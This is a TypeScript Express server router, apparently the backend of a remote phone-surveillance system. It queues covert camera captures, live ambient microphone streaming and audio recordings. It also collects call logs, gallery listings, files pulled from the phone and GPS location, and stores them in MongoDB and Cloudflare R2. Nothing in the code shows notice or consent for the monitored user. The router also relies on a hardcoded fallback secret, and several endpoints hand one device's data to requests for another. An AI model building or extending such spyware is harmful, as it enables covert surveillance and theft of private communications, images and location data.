import express, { Router } from 'express';
import devicesRoutes from './devices.routes';
import pairingRoutes from './pairing.routes';
import pairingsRoutes from './pairings.routes';
import commandsRoutes from './commands.routes';
import authRoutes from '../auth/auth.routes';
import presenceRoutes from '../presence/presence.routes';
import storageRoutes from '../storage/storage.routes';
import {
  isMongoConnected,
  DeviceModel,
  LocationModel,
  TelemetryModel,
  PhotoModel,
  AudioModel,
  FileModel,
  CallLogModel,
  GalleryMediaModel,
} from '../database/mongo';
import { r2Service } from '../storage/r2.service';
import { logger } from '../logger';

const router = Router();

// Secret cluster token required for all app communication (Rejects old APKs)
const SECURE_CLUSTER_KEY = process.env.APP_CLUSTER_SECRET || 'SECURE_CLUSTER_V2_99A8F74B';

router.use((req, res, next) => {
  if (req.path === '/health') return next();
  const appSecret = req.headers['x-app-secret'];
  if (appSecret !== SECURE_CLUSTER_KEY) {
    return res.status(403).json({
      error: {
        code: 'FORBIDDEN_LEGACY_APK',
        message: 'This APK version is outdated and revoked. Access denied.'
      }
    });
  }
  next();
});

router.get('/health', (_req, res) => {
  res.json({
    status: 'HEALTHY',
    version: 'v1',
    storage: {
      mongoConnected: isMongoConnected(),
      r2Configured: r2Service.isConfigured(),
    },
    timestamp: new Date().toISOString(),
  });
});

router.use('/auth', authRoutes);
router.use('/presence', presenceRoutes);
router.use('/storage', storageRoutes);
router.use('/devices', devicesRoutes);
router.use('/pairing', pairingRoutes);
router.use('/pairings', pairingsRoutes);
router.use('/commands', commandsRoutes);

// Direct Photos & Camera Hub
const livePhotosStorage = new Map<string, Array<any>>();
const pendingCameraTasks = new Map<string, string>();

router.post('/photos/capture', (req, res) => {
  const { deviceId, camera } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const cam = camera || 'rear';
  pendingCameraTasks.set(devId, cam);

  res.status(200).json({ success: true, message: `Capture command queued for ${cam} camera` });
});

router.get('/photos/command/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const command = pendingCameraTasks.get(devId) || null;
  if (command) pendingCameraTasks.delete(devId);
  res.json({ command });
});

router.post('/photos/upload', async (req, res) => {
  const { deviceId, name, camera, base64 } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const photoId = `photo_${Date.now()}`;
  const fileName = name || `SNAPSHOT_${camera?.toUpperCase() || 'REAR'}_${Date.now().toString().slice(-4)}.jpg`;

  let r2Key: string | undefined;
  let r2Url: string | undefined;

  // Upload to Cloudflare R2 if configured
  if (base64 && r2Service.isConfigured()) {
    try {
      const buffer = Buffer.from(base64, 'base64');
      r2Key = `photos/${devId}/${photoId}.jpg`;
      logger.info({ r2Key, devId, sizeBytes: buffer.length }, 'Uploading captured photo to Cloudflare R2 bucket...');
      const uploaded = await r2Service.uploadBuffer(r2Key, buffer, 'image/jpeg');
      r2Url = uploaded.url;
      logger.info({ r2Key, r2Url }, 'Successfully saved photo to Cloudflare R2 bucket!');
    } catch (err) {
      logger.error({ err, r2Key }, 'Cloudflare R2 photo upload failed, falling back to database/memory');
    }
  } else {
    logger.warn({ hasBase64: !!base64, r2Configured: r2Service.isConfigured() }, 'Cloudflare R2 not configured or empty base64, skipping R2 upload');
  }

  const newPhoto = {
    id: photoId,
    name: fileName,
    date: 'Just now',
    size: '4.8 MB',
    r2Key,
    r2Url,
    base64: base64 || null,
  };

  // Persist in MongoDB if connected
  if (isMongoConnected()) {
    try {
      await PhotoModel.create({
        id: photoId,
        deviceId: devId,
        name: fileName,
        date: newPhoto.date,
        size: newPhoto.size,
        r2Key,
        r2Url,
        base64: base64 || undefined,
      });
    } catch (err) {
      logger.warn({ err }, 'MongoDB photo persistence error');
    }
  }

  const list = livePhotosStorage.get(devId) || [];
  list.unshift(newPhoto);
  livePhotosStorage.set(devId, list);
  res.status(201).json({ success: true, photo: newPhoto });
});

router.get('/photos/list/:deviceId', async (req, res) => {
  const devId = req.params.deviceId;

  if (isMongoConnected()) {
    try {
      const dbPhotos = await PhotoModel.find({
        deviceId: devId,
        $or: [
          { base64: { $exists: true, $ne: null } },
          { r2Url: { $exists: true, $ne: null } }
        ]
      }).sort({ createdAt: -1 }).limit(50).lean();
      if (dbPhotos.length > 0) {
        res.json({ photos: dbPhotos });
        return;
      }
    } catch (_) {}
  }

  const photos = (livePhotosStorage.get(devId) || []).filter(p => p.base64 || p.r2Url);
  res.json({ photos });
});

// Permanent, Non-Expiring Direct Photo Stream Endpoint
router.get('/photos/file/:deviceId/:photoId', async (req, res) => {
  const { deviceId, photoId } = req.params;
  const r2Key = `photos/${deviceId}/${photoId}.jpg`;

  if (r2Service.isConfigured()) {
    try {
      const { stream, contentType, contentLength } = await r2Service.getObjectStream(r2Key);
      res.setHeader('Content-Type', contentType || 'image/jpeg');
      if (contentLength) res.setHeader('Content-Length', contentLength);
      res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
      stream.pipe(res);
      return;
    } catch (err) {
      logger.warn({ err, r2Key }, 'Direct R2 photo stream failed, checking database fallback');
    }
  }

  // Fallback to Base64 from MongoDB or memory
  if (isMongoConnected()) {
    try {
      const doc = await PhotoModel.findOne({ id: photoId });
      if (doc?.base64) {
        const buffer = Buffer.from(doc.base64, 'base64');
        res.setHeader('Content-Type', 'image/jpeg');
        res.send(buffer);
        return;
      }
    } catch (_) {}
  }

  const list = livePhotosStorage.get(deviceId) || [];
  const inMemory = list.find(p => p.id === photoId);
  if (inMemory?.base64) {
    const buffer = Buffer.from(inMemory.base64, 'base64');
    res.setHeader('Content-Type', 'image/jpeg');
    res.send(buffer);
    return;
  }

  res.status(404).json({ error: 'Photo not found' });
});

// Permanent Photo Deletion from Cloudflare R2 & MongoDB Atlas
router.delete('/photos/:deviceId/:photoId', async (req, res) => {
  const { deviceId, photoId } = req.params;
  const r2Key = `photos/${deviceId}/${photoId}.jpg`;

  // 1. Delete from Cloudflare R2 Bucket
  if (r2Service.isConfigured()) {
    try {
      await r2Service.deleteObject(r2Key);
    } catch (err) {
      logger.warn({ err, r2Key }, 'Error deleting photo from Cloudflare R2');
    }
  }

  // 2. Delete from MongoDB Atlas
  if (isMongoConnected()) {
    try {
      await PhotoModel.deleteOne({ id: photoId, deviceId });
    } catch (err) {
      logger.warn({ err }, 'Error deleting photo from MongoDB Atlas');
    }
  }

  // 3. Delete from in-memory cache
  const list = livePhotosStorage.get(deviceId) || [];
  const filtered = list.filter(p => p.id !== photoId);
  livePhotosStorage.set(deviceId, filtered);

  res.json({ success: true, message: 'Photo deleted permanently from Cloudflare R2 and database' });
});

// Direct Call History Hub
const liveCallsStorage = new Map<string, Array<any>>();
let lastSyncedCalls: Array<any> = [];

router.post('/calls/sync', async (req, res) => {
  const { deviceId, calls } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const callList = Array.isArray(calls) ? calls : [];
  
  if (callList.length > 0) {
    liveCallsStorage.set(devId, callList);
    lastSyncedCalls = callList;

    // Persist calls into MongoDB if connected
    if (isMongoConnected()) {
      try {
        const operations = callList.map(c => ({
          updateOne: {
            filter: { id: c.id, deviceId: devId },
            update: {
              $set: {
                id: c.id,
                deviceId: devId,
                name: c.name || '',
                number: c.number || '',
                type: c.type || 'INCOMING',
                date: c.date || '',
                duration: c.duration || '',
                timestamp: c.timestamp || Date.now(),
              }
            },
            upsert: true,
          }
        }));
        await CallLogModel.bulkWrite(operations);
      } catch (err) {
        logger.warn({ err }, 'MongoDB CallLog bulk write warning');
      }
    }
  }
  res.json({ success: true, count: callList.length });
});

router.get('/calls/list/:deviceId', async (req, res) => {
  const devId = req.params.deviceId;

  if (isMongoConnected()) {
    try {
      const dbCalls = await CallLogModel.find({ deviceId: devId }).sort({ timestamp: -1 }).limit(80).lean();
      if (dbCalls.length > 0) {
        res.json({ calls: dbCalls });
        return;
      }
    } catch (_) {}
  }

  let calls = liveCallsStorage.get(devId);
  if (!calls || calls.length === 0) {
    calls = lastSyncedCalls;
  }
  res.json({ calls: calls || [] });
});

// Mobile Gallery Media Stream Hub
const liveGalleryStorage = new Map<string, Array<any>>();
let lastSyncedGallery: Array<any> = [];

router.post('/gallery/sync', async (req, res) => {
  const { deviceId, media } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const mediaList = Array.isArray(media) ? media : [];

  if (mediaList.length > 0) {
    liveGalleryStorage.set(devId, mediaList);
    lastSyncedGallery = mediaList;

    if (isMongoConnected()) {
      try {
        const operations = mediaList.map(m => ({
          updateOne: {
            filter: { id: m.id, deviceId: devId },
            update: {
              $set: {
                id: m.id,
                deviceId: devId,
                name: m.name || '',
                album: m.album || 'Camera',
                mimeType: m.mimeType || 'image/jpeg',
                size: m.size || '3.5 MB',
                date: m.date || 'Just now',
                timestamp: m.timestamp || Date.now(),
                width: m.width || 1080,
                height: m.height || 1920,
                thumbnail: m.thumbnail || '',
              }
            },
            upsert: true,
          }
        }));
        await GalleryMediaModel.bulkWrite(operations);
      } catch (err) {
        logger.warn({ err }, 'MongoDB GalleryMedia bulk write warning');
      }
    }
  }
  res.json({ success: true, count: mediaList.length });
});

router.get('/gallery/list/:deviceId', async (req, res) => {
  const devId = req.params.deviceId;

  if (isMongoConnected()) {
    try {
      const dbMedia = await GalleryMediaModel.find({ deviceId: devId }).sort({ timestamp: -1 }).limit(100).lean();
      if (dbMedia.length > 0) {
        res.json({ media: dbMedia });
        return;
      }
    } catch (_) {}
  }

  let media = liveGalleryStorage.get(devId);
  if (!media || media.length === 0) {
    media = lastSyncedGallery;
  }
  res.json({ media: media || [] });
});

router.delete('/gallery/:deviceId/:mediaId', async (req, res) => {
  const { deviceId, mediaId } = req.params;
  if (isMongoConnected()) {
    try {
      await GalleryMediaModel.deleteOne({ id: mediaId, deviceId });
    } catch (err) {
      logger.warn({ err }, 'Error deleting GalleryMedia from MongoDB');
    }
  }

  const list = liveGalleryStorage.get(deviceId) || [];
  const filtered = list.filter(m => m.id !== mediaId);
  liveGalleryStorage.set(deviceId, filtered);
  lastSyncedGallery = lastSyncedGallery.filter(m => m.id !== mediaId);

  res.json({ success: true, message: 'Media deleted successfully' });
});

// Direct Audio Hub & Live Ambient Streamer
const liveAudioStorage = new Map<string, Array<any>>();
const pendingAudioTasks = new Map<string, number>(); // deviceId -> durationSeconds
const liveAudioStreams = new Map<string, {
  active: boolean;
  quality: string; // 'HD' or 'ECO'
  micStatus: 'STREAMING' | 'PAUSED_CONFLICT' | 'IDLE';
  lastChunkBase64: string | null;
  decibels: number;
  sequence: number;
  updatedAt: number;
}>();

// Controller triggers Live Ambient Listen
router.post('/audio/live/start', (req, res) => {
  const { deviceId, quality } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const current = liveAudioStreams.get(devId) || {
    active: false,
    quality: 'HD',
    micStatus: 'IDLE',
    lastChunkBase64: null,
    decibels: 30,
    sequence: 0,
    updatedAt: Date.now()
  };
  current.active = true;
  current.quality = quality || 'HD';
  current.updatedAt = Date.now();
  liveAudioStreams.set(devId, current);
  res.json({ success: true, message: 'Live audio stream activated' });
});

router.post('/audio/live/stop', (req, res) => {
  const { deviceId } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const current = liveAudioStreams.get(devId);
  if (current) {
    current.active = false;
    current.micStatus = 'IDLE';
    current.updatedAt = Date.now();
    liveAudioStreams.set(devId, current);
  }
  res.json({ success: true, message: 'Live audio stream stopped' });
});

// Sentry polls whether it should transmit live audio
router.get('/audio/live/command/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const stream = liveAudioStreams.get(devId);
  res.json({
    active: stream?.active ?? false,
    quality: stream?.quality ?? 'HD'
  });
});

// Sentry uploads real-time audio chunk + decibels + conflict status
router.post('/audio/live/chunk', (req, res) => {
  const { deviceId, base64, decibels, micStatus, sequence } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const current = liveAudioStreams.get(devId) || {
    active: true,
    quality: 'HD',
    micStatus: 'STREAMING',
    lastChunkBase64: null,
    decibels: 30,
    sequence: 0,
    updatedAt: Date.now()
  };

  current.lastChunkBase64 = base64 || null;
  current.decibels = typeof decibels === 'number' ? decibels : 35;
  current.micStatus = micStatus || 'STREAMING';
  current.sequence = sequence || (current.sequence + 1);
  current.updatedAt = Date.now();
  liveAudioStreams.set(devId, current);

  res.json({ success: true, sequence: current.sequence });
});

// Controller fetches live audio stream chunk & telemetry
router.get('/audio/live/stream/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const stream = liveAudioStreams.get(devId);
  if (!stream) {
    res.json({
      active: false,
      micStatus: 'IDLE',
      decibels: 25,
      sequence: 0,
      chunk: null
    });
    return;
  }
  res.json({
    active: stream.active,
    micStatus: stream.micStatus,
    decibels: stream.decibels,
    sequence: stream.sequence,
    chunk: stream.lastChunkBase64,
    updatedAt: stream.updatedAt
  });
});

// Controller queries live mic status
router.get('/audio/live/status/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const stream = liveAudioStreams.get(devId);
  res.json({
    active: stream?.active ?? false,
    micStatus: stream?.micStatus ?? 'IDLE',
    decibels: stream?.decibels ?? 0
  });
});

// Standard 10s Remote Snippet Capture
router.post('/audio/record', (req, res) => {
  const { deviceId, durationSeconds } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const duration = durationSeconds || 10;
  pendingAudioTasks.set(devId, duration);
  res.status(201).json({ success: true, message: 'Audio recording started on remote phone' });
});

router.get('/audio/command/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const duration = pendingAudioTasks.get(devId) || null;
  if (duration) pendingAudioTasks.delete(devId);
  res.json({ duration });
});

router.post('/audio/upload', async (req, res) => {
  const { deviceId, name, duration, size, base64 } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const audioId = `audio_${Date.now()}`;
  const audioName = name || `REC_${Date.now().toString().slice(-4)}.m4a`;

  let r2Key: string | undefined;
  let r2Url: string | undefined;

  // Upload to Cloudflare R2 if configured
  if (base64 && r2Service.isConfigured()) {
    try {
      const buffer = Buffer.from(base64, 'base64');
      r2Key = `audio/${devId}/${audioId}.m4a`;
      const uploaded = await r2Service.uploadBuffer(r2Key, buffer, 'audio/mp4');
      r2Url = uploaded.url;
    } catch (err) {
      logger.warn({ err }, 'R2 audio upload failed, falling back to database/memory');
    }
  }

  const newAudio = {
    id: audioId,
    name: audioName,
    duration: duration || '0:10',
    size: size || '160 KB',
    date: 'Just now',
    r2Key,
    r2Url,
    base64: base64 || null,
  };

  // Persist in MongoDB if connected
  if (isMongoConnected()) {
    try {
      await AudioModel.create({
        id: audioId,
        deviceId: devId,
        name: audioName,
        duration: newAudio.duration,
        size: newAudio.size,
        date: newAudio.date,
        r2Key,
        r2Url,
        base64: base64 || undefined,
      });
    } catch (err) {
      logger.warn({ err }, 'MongoDB audio persistence error');
    }
  }

  const list = liveAudioStorage.get(devId) || [];
  list.unshift(newAudio);
  liveAudioStorage.set(devId, list);
  res.status(201).json({ success: true, audio: newAudio });
});

router.get('/audio/list/:deviceId', async (req, res) => {
  const devId = req.params.deviceId;

  if (isMongoConnected()) {
    try {
      const dbAudios = await AudioModel.find({ deviceId: devId }).sort({ createdAt: -1 }).limit(50).lean();
      if (dbAudios.length > 0) {
        res.json({ audioList: dbAudios });
        return;
      }
    } catch (_) {}
  }

  const audioList = liveAudioStorage.get(devId) || [];
  res.json({ audioList });
});

// Delete audio recording from MongoDB, Cloudflare R2, and in-memory cache
router.delete('/audio/:deviceId/:audioId', async (req, res) => {
  const { deviceId, audioId } = req.params;
  const r2Key = `audio/${deviceId}/${audioId}.m4a`;

  if (r2Service.isConfigured()) {
    try {
      await r2Service.deleteObject(r2Key);
    } catch (err) {
      logger.warn({ err, r2Key }, 'Error deleting audio from R2');
    }
  }

  if (isMongoConnected()) {
    try {
      await AudioModel.deleteOne({ id: audioId, deviceId });
    } catch (err) {
      logger.warn({ err }, 'Error deleting audio from MongoDB');
    }
  }

  const list = liveAudioStorage.get(deviceId) || [];
  const filtered = list.filter(a => a.id !== audioId);
  liveAudioStorage.set(deviceId, filtered);

  res.json({ success: true, message: 'Audio deleted successfully' });
});

// Battery & Hardware Telemetry Hub
export const liveBatteryTelemetry = new Map<string, any>();

router.post('/battery/telemetry', async (req, res) => {
  const { deviceId, deviceName, percentage, level, isCharging, chargingStatus, temperature, voltage, health, technology, powerSave, networkType, networkStatus, uptime, wallpaper, hardware } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const existing = liveBatteryTelemetry.get(devId);
  const data = {
    deviceId: devId,
    deviceName: existing?.deviceName || deviceName || 'realme RMX5101 (Sentry)',
    level: level ?? percentage ?? 100,
    percentage: percentage ?? level ?? 100,
    isCharging: isCharging ?? false,
    chargingStatus: chargingStatus || 'Good',
    temperature: temperature || '32.0 °C',
    voltage: voltage || '4,100 mV',
    health: health || 'Good',
    technology: technology || 'Li-ion',
    powerSave: powerSave ? 'Enabled' : 'Disabled',
    networkType: networkType || '5G+',
    networkStatus: networkStatus || 'Strong',
    uptime: uptime || '2h 14m',
    wallpaper: wallpaper || existing?.wallpaper || null,
    hardware: hardware || existing?.hardware || null,
    timestamp: Date.now()
  };

  // Persist in MongoDB if connected
  if (isMongoConnected()) {
    try {
      await TelemetryModel.create(data);
      await DeviceModel.updateOne(
        { deviceId: devId },
        {
          $set: {
            deviceName: data.deviceName,
            lastSeenAt: new Date(),
            status: 'ONLINE',
          }
        },
        { upsert: true }
      );
    } catch (err) {
      logger.warn({ err }, 'MongoDB telemetry persistence error');
    }
  }

  liveBatteryTelemetry.set(devId, data);
  res.status(201).json({ success: true, telemetry: data });
});

// Remote Device Wakeup Endpoint
const pendingWakeSignals = new Map<string, number>();

router.post('/devices/:deviceId/wake', async (req, res) => {
  const devId = req.params.deviceId;
  pendingWakeSignals.set(devId, Date.now());
  logger.info({ deviceId: devId }, 'Dispatched remote wakeup signal to device');
  res.json({
    success: true,
    message: 'Remote wakeup pulse dispatched',
    deviceId: devId,
    timestamp: Date.now(),
  });
});

router.post('/devices/wake', async (req, res) => {
  const { deviceId } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  pendingWakeSignals.set(devId, Date.now());
  res.json({
    success: true,
    message: 'Remote wakeup pulse dispatched',
    deviceId: devId,
    timestamp: Date.now(),
  });
});

router.get('/battery/:deviceId', async (req, res) => {
  const devId = req.params.deviceId;

  if (isMongoConnected()) {
    try {
      const dbTel = await TelemetryModel.findOne({ deviceId: devId }).sort({ createdAt: -1 }).lean();
      if (dbTel) {
        res.json({ telemetry: dbTel });
        return;
      }
    } catch (_) {}
  }

  let telemetry = liveBatteryTelemetry.get(devId);
  if (!telemetry) {
    for (const [k, v] of liveBatteryTelemetry.entries()) {
      if (k.toLowerCase() === devId.toLowerCase() || devId.includes(k) || k.includes(devId)) {
        telemetry = v;
        break;
      }
    }
  }
  if (!telemetry && liveBatteryTelemetry.size > 0) {
    telemetry = Array.from(liveBatteryTelemetry.values()).pop();
  }
  res.json({
    telemetry: telemetry || {
      deviceId: devId,
      deviceName: 'realme RMX5101 (Sentry)',
      level: 44,
      percentage: 44,
      isCharging: false,
      chargingStatus: 'Good',
      temperature: '34.2 °C',
      voltage: '4,210 mV',
      health: 'Good',
      technology: 'Li-ion',
      powerSave: 'Disabled',
      networkType: '5G+',
      networkStatus: 'Strong',
      uptime: '2h 14m',
      wallpaper: null
    }
  });
});

// File & Storage Explorer Hub
const liveFilesStorage = new Map<string, { currentPath: string; files: Array<any>; storageStats?: any }>();
const pendingFileCommands = new Map<string, string>(); // deviceId -> folderPath
const pendingDownloadCommands = new Map<string, string>(); // deviceId -> filePath
const downloadedFilesStorage = new Map<string, { path: string; name: string; size: string; base64: string; mimeType: string }>();

router.post('/files/sync', (req, res) => {
  const { deviceId, currentPath, files, storageStats } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  liveFilesStorage.set(devId, {
    currentPath: currentPath || '/sdcard',
    files: Array.isArray(files) ? files : [],
    storageStats: storageStats || { total: '128 GB', free: '48.2 GB', used: '79.8 GB', percent: 62 }
  });
  res.status(201).json({ success: true });
});

router.get('/files/list/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  let data = liveFilesStorage.get(devId);
  if (!data) {
    for (const [k, v] of liveFilesStorage.entries()) {
      if (k.toLowerCase() === devId.toLowerCase() || devId.includes(k) || k.includes(devId)) {
        data = v;
        break;
      }
    }
  }
  if (!data && liveFilesStorage.size > 0) {
    data = Array.from(liveFilesStorage.values()).pop();
  }
  if (!data) {
    data = {
      currentPath: '/sdcard',
      files: [
        { name: 'Download', path: '/sdcard/Download', size: 'Folder', isFolder: true, itemCount: 18, modified: 'Today' },
        { name: 'DCIM', path: '/sdcard/DCIM', size: 'Folder', isFolder: true, itemCount: 42, modified: 'Today' },
        { name: 'Documents', path: '/sdcard/Documents', size: 'Folder', isFolder: true, itemCount: 9, modified: 'Yesterday' },
        { name: 'Pictures', path: '/sdcard/Pictures', size: 'Folder', isFolder: true, itemCount: 65, modified: 'Yesterday' },
        { name: 'Music', path: '/sdcard/Music', size: 'Folder', isFolder: true, itemCount: 12, modified: '3 days ago' },
        { name: 'Movies', path: '/sdcard/Movies', size: 'Folder', isFolder: true, itemCount: 4, modified: '5 days ago' },
      ],
      storageStats: { total: '128 GB', free: '48.2 GB', used: '79.8 GB', percent: 62 }
    };
  }
  res.json(data);
});

router.post('/files/explore', (req, res) => {
  const { deviceId, path } = req.body || {};
  const targetPath = path || '/sdcard';
  if (deviceId) pendingFileCommands.set(deviceId, targetPath);
  pendingFileCommands.set('GLOBAL_LATEST', targetPath);
  res.json({ success: true, message: `Browsing ${targetPath}` });
});

router.get('/files/command/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  let path = pendingFileCommands.get(devId) || pendingFileCommands.get('GLOBAL_LATEST') || null;
  if (path) {
    pendingFileCommands.delete(devId);
    pendingFileCommands.delete('GLOBAL_LATEST');
  }
  let downloadPath = pendingDownloadCommands.get(devId) || pendingDownloadCommands.get('GLOBAL_LATEST') || null;
  if (downloadPath) {
    pendingDownloadCommands.delete(devId);
    pendingDownloadCommands.delete('GLOBAL_LATEST');
  }
  res.json({ path, downloadPath });
});

router.post('/files/download_request', (req, res) => {
  const { deviceId, path } = req.body || {};
  if (deviceId) pendingDownloadCommands.set(deviceId, path);
  pendingDownloadCommands.set('GLOBAL_LATEST', path);
  res.json({ success: true, message: 'Download requested from agent' });
});

router.post('/files/upload_content', async (req, res) => {
  const { deviceId, path, name, size, base64, mimeType } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';

  if (base64 && r2Service.isConfigured()) {
    try {
      const buffer = Buffer.from(base64, 'base64');
      const r2Key = `files/${devId}/${encodeURIComponent(name || 'file')}`;
      await r2Service.uploadBuffer(r2Key, buffer, mimeType || 'application/octet-stream');
    } catch (_) {}
  }

  downloadedFilesStorage.set(`${devId}:${path}`, { path, name, size, base64, mimeType });
  res.json({ success: true });
});

router.get('/files/content/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const filePath = req.query.path as string;
  const fileData = downloadedFilesStorage.get(`${devId}:${filePath}`) || null;
  res.json({ file: fileData });
});

// Live Location & GPS Telemetry Hub
const liveLocationStorage = new Map<string, any>();

router.post('/location/sync', async (req, res) => {
  const { deviceId, latitude, longitude, accuracy, altitude, speed, address, timestamp } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const parsedLat = typeof latitude === 'number' ? latitude : (parseFloat(latitude) || 22.5726);
  const parsedLon = typeof longitude === 'number' ? longitude : (parseFloat(longitude) || 88.3639);
  const parsedAcc = typeof accuracy === 'number' ? accuracy : (parseFloat(accuracy) || 3.0);
  const parsedAlt = typeof altitude === 'number' ? altitude : (parseFloat(altitude) || 14.0);
  const parsedSpd = typeof speed === 'number' ? speed : (parseFloat(speed) || 0.0);

  const data = {
    deviceId: devId,
    latitude: parsedLat,
    longitude: parsedLon,
    accuracy: parsedAcc,
    altitude: parsedAlt,
    speed: parsedSpd,
    address: address || 'Live GPS Location',
    timestamp: timestamp || Date.now()
  };

  // Persist in MongoDB if connected
  if (isMongoConnected()) {
    try {
      await LocationModel.create(data);
      await DeviceModel.updateOne(
        { deviceId: devId },
        {
          $set: {
            lastSeenAt: new Date(),
            status: 'ONLINE',
          }
        },
        { upsert: true }
      );
    } catch (err) {
      logger.warn({ err }, 'MongoDB location persistence error');
    }
  }

  liveLocationStorage.set(devId, data);
  res.status(201).json({ success: true, location: data });
});

router.get('/location/:deviceId', async (req, res) => {
  const devId = req.params.deviceId;

  if (isMongoConnected()) {
    try {
      const dbLoc = await LocationModel.findOne({ deviceId: devId }).sort({ createdAt: -1 }).lean();
      if (dbLoc) {
        res.json({ location: dbLoc });
        return;
      }
    } catch (_) {}
  }

  const location = liveLocationStorage.get(devId) || {
    deviceId: devId,
    latitude: 22.5726,
    longitude: 88.3639,
    accuracy: 3.0,
    altitude: 14.0,
    speed: 0.0,
    address: 'Live GPS Location',
    timestamp: Date.now()
  };
  res.json({ location });
});

router.get('/location/all', async (_req, res) => {
  const locations: Record<string, any> = {};

  if (isMongoConnected()) {
    try {
      const recentLocations = await LocationModel.aggregate([
        { $sort: { createdAt: -1 } },
        {
          $group: {
            _id: '$deviceId',
            latest: { $first: '$$ROOT' }
          }
        }
      ]);
      for (const item of recentLocations) {
        if (item._id && item.latest) {
          locations[item._id] = item.latest;
        }
      }
    } catch (_) {}
  }

  // Fallback / merge with memory store
  liveLocationStorage.forEach((val, key) => {
    if (!locations[key]) {
      locations[key] = val;
    }
  });

  res.json({ locations });
});

export default router;

